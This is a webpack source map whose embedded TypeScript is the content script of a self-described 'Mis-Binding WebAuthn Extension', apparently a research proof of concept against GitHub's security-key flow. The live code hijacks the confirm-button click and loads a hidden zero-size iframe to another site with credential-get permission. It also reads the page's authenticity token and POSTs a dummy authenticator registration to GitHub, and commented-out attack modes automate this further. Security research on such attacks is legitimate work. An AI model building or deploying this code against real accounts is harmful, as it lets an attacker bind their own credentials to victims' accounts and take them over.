{"version":3,"file":"content.js","mappings":";;AAAA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA","sources":["webpack:///./content.ts"],"sourcesContent":["\"use strict\";\nconst script = document.createElement('script');\nscript.src = chrome.runtime.getURL('inject.js');\nscript.onload = () => script.remove();\n(document.head || document.documentElement).appendChild(script);\n// Listen for messages from the injected script\n// window.addEventListener('message', function(event) {\n//     // Only accept messages from the same window\n//     if (event.source !== window) return;\n//     if (event.data) {\n//         // Relay the message to the background script\n//         chrome.runtime.sendMessage(event.data);\n//     }\n// });\n// Original code\nconst relevantEventTypes = ['create', 'sign'];\nlet passToOrig = true;\nwindow.addEventListener('message', async (event) => {\n    // We only accept messages from this window to itself, no iframes allowed.\n    if (event.source !== window) {\n        return;\n    }\n    // Relay relevant messages only.\n    if (event.data.type) {\n        if (event.data.resp && event.data.resp.type === 'error') {\n            alert(`[Mis-Binding WebAuthn Extension]: ${event.data.resp.exception}`);\n        }\n        else if (relevantEventTypes.indexOf(event.data.type) > -1) {\n            const backgroundResponse = await chrome.runtime.sendMessage(event.data);\n            // The callback function will relay the extension response\n            // to the window object.\n            window.postMessage({\n                requestID: backgroundResponse.requestID,\n                resp: backgroundResponse,\n                type: backgroundResponse.type,\n            }, window.location.origin);\n        }\n    }\n}, false);\nfunction waitForElement(callBack) {\n    window.setTimeout(function () {\n        var element = document.querySelectorAll('div[class=\"js-u2f-registration width-full\"]')[1];\n        if (element) {\n            console.log(\"Found element\");\n            callBack(element);\n        }\n        else {\n            waitForElement(callBack);\n        }\n    }, 500);\n}\ndocument.addEventListener('DOMContentLoaded', () => {\n    // waitForElement(,function(){\n    //   console.log(\"FOUND 2nd elemdone\");\n    // });\n    chrome.runtime.sendMessage({ type: 'getPassToOrig' });\n    chrome.runtime.sendMessage({ type: 'attack-type-get' }, (resp) => {\n        const dummyAuth = document.querySelectorAll('div[class=\"js-u2f-registration width-full\"]');\n        // if (dummyAuth.length == 1) {\n        //   const dummyAuth2 = document.querySelectorAll('div[class=\"js-u2f-registration width-full\"]')[1] as HTMLElement;\n        //   dummyAuth2.style.display = 'none'; \n        // }\n        // const element = document.querySelector('span[data-test-id=\"security-key-nickname\"]');\n        // if (resp.attackType === 'attack-double-binding1') {\n        //   // Listens when second dummyauth is added and hides it\n        //   var target = document.querySelector('.js-u2f-registrations.mb-2.ml-2.width-full');\n        //   var observer = new MutationObserver(function(mutations) {\n        //     mutations.forEach(function(mutation) {\n        //       console.log(mutation.type);\n        //         // alert('This is a test 2');\n        //         const elem = document.querySelectorAll('div[class=\"js-u2f-registration width-full\"]')[1];\n        //         if (elem) {\n        //           (elem as HTMLElement).style.display = 'none';\n        //           chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-none'});\n        //         }\n        //     });\n        //   });\n        //   // configuration of the observer\n        //   var config = { attributes: true, childList: true, characterData: true, subtree: true };\n        //   observer.observe(target, config);\n        //   if (dummyAuth.length == 1) {\n        //     // if attack type double binding 1 change to 2\n        //     chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-double-binding2'});\n        //     passToOrig = false;\n        //     window.postMessage({ message: 'passToOrig', val: passToOrig }, window.location.origin);\n        //     const nickname = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('input[name=\"nickname\"]') as HTMLInputElement;\n        //     nickname.value = \"admin\";\n        //     const subButton = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form').querySelector('button[type=\"submit\"]') as HTMLButtonElement;\n        //     subButton.removeAttribute('disabled');\n        //     subButton.click();\n        //   } \n        // } else if (resp.attackType === 'attack-double-binding2') {\n        //   if (dummyAuth.length == 0) {\n        //     chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-double-binding1'});\n        //   } else {\n        //     const dummyAuth = document.querySelectorAll('div[class=\"js-u2f-registration width-full\"]')[1] as HTMLElement;\n        //     dummyAuth.style.display = 'none'; \n        //     chrome.runtime.sendMessage({type: 'attack-type-change', newAttackType: 'attack-none'});\n        //   }\n        // } else if (resp.attackType === 'attack-sync-login') {\n        //   const webpageURL = window.location.href;\n        //   console.log(webpageURL);\n        //   if (webpageURL === \"https://github.com/sessions/two-factor/webauthn\") {\n        //     const addButton = document.querySelector(\".js-webauthn-confirm-button.btn.btn-block.Button--primary.Button--medium.Button.mt-0\") as HTMLButtonElement;\n        //     if (addButton) {\n        //       console.log(\"Added iframe on load\");\n        //         document.addEventListener('click', handleRegisterButtonClick, true);\n        //     }\n        //   }\n        // }\n    });\n});\nfunction handleRegisterButtonClick(event) {\n    if (event.target.closest('.js-webauthn-confirm-button')) {\n        event.preventDefault(); // Prevent the default form submission\n        event.stopPropagation(); // disables the bubbling phase listeners\n        const iframe = document.createElement('iframe');\n        iframe.src = 'https://testbank.com:8443';\n        iframe.id = \"iframeWebSyncLogin\";\n        iframe.width = '0';\n        iframe.height = '0';\n        iframe.allow = 'publickey-credentials-get *';\n        document.body.appendChild(iframe);\n    }\n}\nchrome.runtime.onMessage.addListener(async function (request, sender, sendResponse) {\n    const addButton = document.querySelector(\".js-webauthn-confirm-button.btn.btn-block.Button--primary.Button--medium.Button.mt-0\");\n    // alert(request.message);\n    if (request.message === \"push-iframe-code\") {\n        // const form = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form');\n        // const addButton = form.querySelector('div > span > button');\n        // alert(addButton);\n        console.log(\"GOTT iframe push\");\n        if (addButton) {\n            // const form = document.querySelector('.js-webauthn-form');\n            // form.addEventListener('submit', handleRegisterButtonClick);\n            // addButton.addEventListener('click', (event) => {\n            //   event.preventDefault();\n            //   handleRegisterButtonClick(event);\n            // });\n            // document.addEventListener('click', e => {\n            //   if (e.target.closest('.js-webauthn-confirm-button')) {\n            //     e.preventDefault(); // disables the browser's default behavior\n            //   }\n            // }, true);\n            console.log(\"ADDED event listener\");\n            document.addEventListener('click', handleRegisterButtonClick, true);\n            // addButton.addEventListener('click', removeRegisterButtonListener);\n        }\n    }\n    else if (request.message === 'start-orig-login') {\n        // addButton.removeEventListener('click', handleRegisterButtonClick);\n        console.log(\"REMOVED event listener\");\n        document.removeEventListener('click', handleRegisterButtonClick, true);\n        addButton.click();\n    }\n    else if (request.message === 'getGithubWebAuthnReq') {\n        // Perform actions to get the HTML content\n        // const htmlContent = document.documentElement.outerHTML;\n        const webAuthnRegReq = document.querySelector('.add-u2f-registration-form')?.getAttribute('data-webauthn-register-request');\n        // Send the response back to the background script\n        sendResponse(webAuthnRegReq);\n    }\n    else if (request.message === 'registerDummyAuth') {\n        const authToken = document.querySelector('.add-u2f-registration-form.js-add-u2f-registration-form')?.querySelector('input[name=\"authenticity_token\"]');\n        // request.resp.id = \"AnIB9pkhUNufJjJTZlqDR8GRnb5da3EyPhpjKziRD-kko5s6UApVD8XhslDULfRXlBtvDocwbPCHoEo2wzBSww\";\n        // request.resp.rawId = \"AnIB9pkhUNufJjJTZlqDR8GRnb5da3EyPhpjKziRD-kko5s6UApVD8XhslDULfRXlBtvDocwbPCHoEo2wzBSww\";\n        const formData = new FormData();\n        formData.append(\"authenticty_token\", authToken.value);\n        formData.append(\"page_view\", \"settings_security\");\n        formData.append(\"response\", request.resp);\n        formData.append(\"nickname\", \"test\");\n        await fetch(\"https://github.com/sessions/in_sudo\", { method: 'GET', headers: { 'Accept': 'application/json' } });\n        // Send the credential\n        const result = await fetch(\"https://github.com/u2f/registrations\", {\n            method: 'POST',\n            body: formData,\n            headers: { 'accept': 'application/json' },\n            // headers: { 'origin':'https://github.com','referer': 'https://github.com/settings/security','x-requested-with':'XMLHttpRequest', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryAwc0Asua0DeM76FP', 'accept': 'application/json' }\n        });\n    }\n    else if (request.message === 'passToOrig') {\n        // Send a message to the injected script\n        console.log(\"in content with passToOrig \", passToOrig);\n        passToOrig = request.val;\n        window.postMessage({ message: 'passToOrig', val: passToOrig }, window.location.origin);\n    }\n    else if (request.message === 'reloadPage') {\n        // location.reload();\n    }\n});\n"],"names":[],"sourceRoot":""}